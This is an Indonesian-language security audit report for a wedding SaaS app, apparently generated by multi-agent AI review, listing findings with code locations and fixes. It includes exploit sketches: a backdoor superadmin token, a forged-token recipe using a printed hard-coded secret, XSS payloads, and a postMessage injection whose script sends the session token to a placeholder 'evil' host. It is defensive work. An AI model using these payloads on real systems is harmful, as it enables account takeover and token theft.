# 🔒 Laporan Analisis Keamanan — Wedding SaaS

> **Tanggal:** 2026-06-20
> **Cakupan:** `backend/Code.gs` (Google Apps Script, ~4719 baris) + frontend React/Vite (`src/`)
> **Metode:** Audit multi-agen (35 agen, 5 dimensi keamanan) dengan verifikasi adversarial tiap temuan, dikonfirmasi manual pada temuan kritis.

## Ringkasan Eksekutif

Audit menemukan **30 isu mentah → 24 terverifikasi nyata** (6 ditolak sebagai false-positive setelah verifikasi).

| Severity | Jumlah |
|----------|--------|
| 🔴 KRITIS | 6 |
| 🟠 TINGGI | 6 |
| 🟡 SEDANG | 9 |
| 🟢 RENDAH | 3 |

> ⚠️ **Penilaian jujur:** Tidak ada sistem yang "tidak bisa di-hack" secara mutlak. Namun saat ini sistem ini **mudah dieksploitasi** — beberapa lubang dapat dimanfaatkan siapa saja dalam hitungan menit tanpa keahlian khusus. Yang paling parah justru paling cepat ditambal. Target realistis: tutup celah KRITIS & TINGGI agar serangan menjadi tidak praktis.

### 3 Prioritas Utama (perbaiki hari ini, ≈1 jam, menutup ~90% risiko)
1. **Hapus backdoor `dummy-superadmin-token`** — `Code.gs:821-827`
2. **Validasi harga pembayaran di server** — `Code.gs:3447`
3. **Pindahkan `TOKEN_SECRET` ke ScriptProperties + rotasi** — `Code.gs:14`

---

## 🔴 KRITIS

### K1 — Backdoor superadmin: token statis `dummy-superadmin-token`
- **Lokasi:** `backend/Code.gs:821-827` (`AuthService.validateToken`)
- **Masalah:** `validateToken` langsung mengembalikan identitas superadmin jika token string sama dengan `'dummy-superadmin-token'` — tanpa signature, tanpa expiry, tanpa kredensial.
- **Eksploit:** `GET ?action=getTenants&token=dummy-superadmin-token` → akses superadmin penuh: baca/hapus/ubah data SEMUA tenant, `impersonateTenant`, `deleteTenant`, edit plan/coupon. Tidak butuh password atau secret apa pun.
- **Bukti:**
  ```js
  if (token === 'dummy-superadmin-token') {
    return { user_id: 'super-123', role: 'superadmin', tenant_id: 'system' };
  }
  ```
- **Perbaikan:** Hapus total blok ini dari kode produksi. Jika butuh identitas sistem untuk cron/setup, turunkan dari secret di ScriptProperties yang tidak pernah dikirim ke klien.

### K2 — Harga pembayaran dipercaya penuh dari klien (bayar Rp1.000 untuk Premium)
- **Lokasi:** `createTransaction` `Code.gs:3440-3567` (amount di 3447, gross_amount di 3509); `_activateItem` `Code.gs:3895-3930`; aktivasi via `handleWebhook` (3887) & `getTransactionStatus` (3666)
- **Masalah:** `amount`, `item_id`, `item_type` diambil mentah dari payload klien. Satu-satunya validasi adalah `amount > 0`. Server tidak pernah melihat harga asli di sheet `PlanType`/`MstAdditionalFeature`. Setelah pembayaran (dengan signature Midtrans yang valid untuk nominal kecil), `_activateItem` meng-upgrade tenant ke item yang diminta tanpa membandingkan nominal vs harga.
- **Eksploit:** Tenant_admin kirim `{item_type:'plan', item_id:'premium', item_name:'x', amount:1000}` → bayar Rp1.000 lewat Snap → webhook settlement valid → tenant jadi Premium. Sama untuk fitur berbayar.
- **Bukti:**
  ```js
  var originalAmount = parseInt(payload.amount);     // 3447 — dari klien
  ...
  transaction_details: { order_id: orderId, gross_amount: amount }  // 3509
  ...
  DB.update('Tenants', tenantId, { plan_type: itemId, guest_limit: this.getPlanGuestLimit(itemId) }); // _activateItem
  ```
- **Perbaikan:** Abaikan `amount` dari klien. Ambil harga otoritatif dari sheet berdasarkan `item_id`, hitung selisih upgrade + kupon di server, simpan `expected_amount`, dan verifikasi `gross_amount == expected_amount` sebelum aktivasi (di `handleWebhook` DAN `getTransactionStatus`). Tolak `item_id` yang tidak ada di katalog.

### K3 — `TOKEN_SECRET` hard-coded di source → semua token dapat dipalsukan
- **Lokasi:** `backend/Code.gs:14`; dipakai di `generateToken` (805-817), `validateToken` (819-842), `hashPassword` (794-799)
- **Masalah:** `TOKEN_SECRET = 'wedding-saas-secret-key-2026'` ditulis literal di source (dan `Code.gs` ada di git). Token = `base64(payload) + '.' + SHA256(encoded + TOKEN_SECRET)`. Tidak ada sesi server-side; `validateToken` hanya menghitung ulang signature. Siapa pun yang tahu secret bisa menempa token untuk role/tenant apa pun. Secret yang sama dipakai sebagai pepper password.
- **Eksploit (offline, tanpa kompromi server):**
  ```
  payload = {user_id:'x', role:'superadmin', tenant_id:'<korban>', expired_at:'2099-01-01T00:00:00Z'}
  encoded = base64(JSON.stringify(payload))
  sig     = SHA256hex(encoded + 'wedding-saas-secret-key-2026')
  token   = encoded + '.' + sig
  ```
  Token ini lolos `validateToken`, memberi superadmin + tenant_id arbitrer → isolasi antar-tenant runtuh total.
- **Perbaikan:** Pindahkan secret ke `PropertiesService.getScriptProperties()` (pola yang **sudah benar** dipakai `MIDTRANS_SERVER_KEY` di baris 18). Gunakan nilai acak ≥256-bit, rotasi (meng-invalidasi token lama). Idealnya tambahkan komponen sesi/`jti` server-side agar signature saja tidak cukup.

### K4, K5, K6 — Konfirmasi independen lintas-dimensi
Tiga temuan kritis tambahan adalah pelaporan **independen** atas K1–K3 oleh agen dimensi berbeda (authn-session-crypto & payment-config-misc). Konvergensi ini memperkuat keyakinan bahwa ketiganya nyata dan bukan artefak satu sudut pandang. Tindakannya sama dengan K1–K3.

---

## 🟠 TINGGI

### T1 — Stored XSS via ucapan tamu (unauthenticated)
- **Lokasi:** Sumber `submitWish` `Code.gs:2078` (publik, tanpa auth) → `Validator.sanitize` `Code.gs:420` → `src/utils/templateParser.ts:145-151` (tanpa escaping) → `dangerouslySetInnerHTML` di `ThemeWrapper.tsx:674` / `InvitationPage.tsx:1267`
- **Masalah:** Sanitizer hanya `replace(/<[^>]*>/g,'')`. Payload tanpa `>` penutup (mis. `<img src=x onerror=alert(document.cookie)`) lolos utuh, lalu dirender mentah pada tema kustom; markup tema sekitarnya melengkapi tag → JS dieksekusi.
- **Dampak:** XSS tersimpan yang berjalan di setiap pengunjung undangan publik DAN di dashboard admin saat melihat wishes → pencurian token/sesi (termasuk superadmin).
- **Tema terdampak:** semua tema bawaan merender `{{this.guest_message}}` (black-gold, matcha, deep-forest, glassmorphism, lake-como).
- **Perbaikan:** Escape entitas HTML di `parseTemplate`; pasang DOMPurify di sisi render; jangan andalkan regex strip-tag.

### T2 — XSS via tema kustom (data tenant/tamu masuk mentah ke `dangerouslySetInnerHTML`)
- **Lokasi:** `ThemeWrapper.tsx:674` (sink); `templateParser.ts:145-151` (tanpa escaping); `InvitationPage.tsx:1040-1100`
- **Masalah:** Path tema kustom membangun HTML via `parseTemplate` (substitusi `{{var}}` dengan `String(val)` tanpa escaping) lalu render mentah. Data mencakup wishes, nama mempelai/orang tua/lokasi.
- **Perbaikan:** Sama dengan T1 (escaping + DOMPurify). Whitelist eksplisit hanya untuk field yang sengaja berisi HTML tepercaya.

### T3 — Listener `postMessage` tanpa validasi origin → injeksi tema HTML/JS arbitrer
- **Lokasi:** `src/features/invitation/pages/InvitationPage.tsx:297-319`; sink di `ThemeWrapper.tsx:172-183` (eksekusi `js_template`) & `:674`
- **Masalah:** Listener `message` menerima `invitation-preview-update` dan me-merge `event.data.theme` ke state **tanpa cek `event.origin`/`event.source`**, dan listener aktif di halaman undangan **publik** (bukan hanya mode editor).
- **Eksploit:** Halaman penyerang `window.open('https://app/<slug>')` lalu `postMessage({type:'invitation-preview-update', theme:{html_template:'<img src=x onerror=...>', js_template:'fetch(evil, {body: sessionStorage.getItem("wedding-saas-auth")})'}}, '*')` → JS arbitrer di origin aplikasi, pencurian token.
- **Perbaikan:** Validasi `event.origin` terhadap allowlist; aktifkan listener hanya saat mode preview/editor (jaga dengan flag `previewData`).

### T4 — Sanitizer backend berbasis regex strip-tag sebagai satu-satunya pertahanan XSS
- **Lokasi:** `Code.gs:420-422`
- **Masalah:** Blacklist `replace(/<[^>]*>/g,'')` mudah dilewati; merupakan akar T1 & T2.
- **Perbaikan:** Ganti dengan output-encoding context-aware / allowlist; DOMPurify di sisi klien.

### T5, T6 — Konfirmasi independen TOKEN_SECRET & integritas webhook
- **T5:** Pelaporan ulang TOKEN_SECRET hard-coded dari dimensi payment-config (lihat K3).
- **T6 — Webhook tidak verifikasi nominal vs harga:** `handleWebhook` benar memverifikasi signature SHA512, **tetapi** aktivasi hanya berdasarkan status, bukan kecocokan `gross_amount` dengan harga item. `getTransactionStatus` juga jalur aktivasi kedua dengan kelemahan sama. (Turunan dari K2; perbaikan menyatu dengan K2.)

---

## 🟡 SEDANG

| # | Temuan | Lokasi | Inti & Perbaikan |
|---|--------|--------|------------------|
| S1 | **imageProxy tanpa auth/scoping** | `Code.gs:53-69` | Mengembalikan isi Drive file apa pun by-ID, dieksekusi sebelum gate auth. Drive ID bocor lewat halaman publik & respons API; termasuk **backup JSON berisi data penuh tenant**. → Wajibkan token + verifikasi `tenant_id` baris Images cocok. |
| S2 | **Rate-limit dapat dilewati** | `Code.gs:72` | Kunci limit = `payload.token` (dikontrol klien). Kirim token acak unik tiap request → bucket baru terus → limit hilang. Membuka brute-force login & spam. → Limit per-IP/slug, bukan per-token. |
| S3 | **Password SHA-256 tanpa salt per-user** | `Code.gs:794-803` | Pepper = TOKEN_SECRET (global, diketahui). Hash identik untuk password sama; brute-force cepat bila sheet `Users` bocor. → Salt acak per-user + key-stretching (PBKDF2). |
| S4 | **Tidak ada throttle/lockout login** | `Code.gs:72-75, 685-696` | Tidak ada penghitung gagal per-username; dikombinasi S2 → brute-force kredensial admin tanpa hambatan. → Counter gagal per-username di CacheService + lockout/backoff + CAPTCHA. |
| S5 | **Formula/CSV injection** | `Code.gs:420-423, 2078, 2107`; `src/shared/utils/exportUtils.ts:44-52` | Input publik (`=`,`+`,`-`,`@`) ditulis mentah ke Sheet; saat admin ekspor XLSX, formula dieksekusi (`IMPORTXML`/`HYPERLINK` exfiltrasi data). → Netralisasi formula saat tulis (prefix `'`) di `DB.insert` & `exportToExcel`. |
| S6 | **uploadImage tanpa validasi** | `Code.gs:2150-2233` | Tanpa allowlist MIME, batas ukuran, atau verifikasi magic-byte; nama file dari klien; auto `ANYONE_WITH_LINK`. → File arbitrer & DoS kuota Drive. Validasi MIME/ukuran/magic-byte, nama file dari server. |
| S7 | **Token di query parameter** | `src/core/api/apiClient.ts:26-32` | Token muncul di URL tiap request → bocor lewat GAS/proxy logs & history. → Kirim via header Authorization; jangan duplikasi ke URL. |
| S8 | **Token di sessionStorage** | `src/features/auth/store/authStore.ts:45-62` | Terbaca JS apa pun di origin → tercuri begitu ada XSS (T1–T3). → Idealnya httpOnly+Secure cookie; minimal tutup semua jalur XSS + token berumur pendek. |
| S9 | **Hashing password lemah (dup)** | `Code.gs:794-803` | Konfirmasi independen S3 dari dimensi authn. |

---

## 🟢 RENDAH

| # | Temuan | Lokasi | Inti |
|---|--------|--------|------|
| R1 | **Enumerasi nama tamu** | `Code.gs:2019-2040` (`checkPublicGuest`) | Oracle publik: cek apakah nama X ada di guest list slug tertentu. → Gate dengan invitation_code + rate-limit IP. |
| R2 | **Cross-tenant quote (IDOR)** | `Code.gs:3062-3066` (`saveTenantQuotes`) | Tenant bisa mengarahkan `quotes_id` ke quote privat tenant lain (butuh UUID korban). → Validasi quote global atau milik caller. |
| R3 | **Token tidak di-revoke saat ganti password** | `Code.gs:805-842, 985-1006`, logout 111-112 | Token lama tetap valid ≤24 jam setelah ganti password/logout. → Tambah `password_changed_at`/versi token, tolak token usang. |

---

## ✅ Yang Sudah Benar (jangan diubah)

- **`.env` tidak ter-commit ke git** (`.gitignore` benar; `git ls-files` mengonfirmasi).
- **`MIDTRANS_SERVER_KEY` di ScriptProperties** (`Code.gs:18`), **tidak** bocor ke bundle `dist/` (diverifikasi grep).
- **Webhook Midtrans memverifikasi signature SHA512** (`Code.gs:3846-3867`) — pemalsuan status pembayaran tertahan (selama server key rahasia).
- **`getTenantId(auth)` mengambil tenant dari token**, bukan input klien (`Code.gs:1021-1029`) — desain isolasi tenant yang benar.

## ❌ Temuan yang Ditolak Setelah Verifikasi (false-positive)

1. **Signature compare tidak constant-time** — secara teori benar, tapi tidak praktis di lingkungan GAS (noise jaringan) dan sudah didominasi isu TOKEN_SECRET.
2. **Webhook lewati signature saat `signature_key` kosong** — branch test-notification tidak mengubah state & tidak mengakses DB; bukan oracle.
3. **`eval()` JS landing page** — sumber hanya superadmin (trusted), bukan lintas trust-boundary.
4. **Midtrans server key di `.env`** — tidak di-bundle ke frontend, tidak di git, backend pakai ScriptProperties. (Catatan hygiene: perbaiki label sandbox/prod yang tidak konsisten & hapus dari `.env` frontend.)
5. **Tenant tandai fitur "Sudah dibayar"** — akses fitur di-gate oleh field `active` (hanya superadmin yang bisa set), bukan `payment_status`. Hanya nuisance data-integrity.
6. **Test-notification bypass (varian)** — sama dengan #2.

---

## 📋 Rencana Aksi

**Hari ini (≈1 jam, ~90% risiko):**
1. Hapus backdoor `dummy-superadmin-token` (K1)
2. Pindah `TOKEN_SECRET` ke ScriptProperties + rotasi (K3)
3. Validasi harga pembayaran di server (K2)

**Minggu ini:**
4. DOMPurify + escape `templateParser` (T1, T2, T4)
5. Validasi origin pada listener `postMessage` (T3)
6. Auth + tenant-scoping pada `imageProxy` (S1)
7. Perbaiki kunci rate-limit (per-IP/slug) + lockout login (S2, S4)
8. Salt password per-user + PBKDF2 (S3)

**Backlog:**
9. Token via header, bukan query param (S7); netralisasi formula export (S5); validasi uploadImage (S6); revocation token (R3); hardening enumerasi (R1, R2).

---

*Laporan dihasilkan oleh audit multi-agen dengan verifikasi adversarial. Nomor baris merujuk pada kondisi repo per 2026-06-20.*
